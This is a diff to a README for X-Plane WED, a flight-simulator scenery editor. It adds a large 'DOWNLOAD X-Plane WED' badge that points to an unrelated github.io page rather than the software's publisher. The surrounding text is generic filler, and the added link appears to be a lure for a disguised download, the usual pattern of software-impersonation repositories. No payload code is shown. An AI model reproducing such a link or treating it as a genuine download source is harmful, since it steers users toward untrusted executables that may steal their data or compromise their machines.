@@ -30,6 +30,12 @@ WED (World Editor) is the official X-Plane scenery authoring tool for creating a
 
 Whether you're a newcomer or a veteran, X-Plane WED provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download X-Plane WED](https://img.shields.io/badge/⬇_DOWNLOAD_X+Plane+WED-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
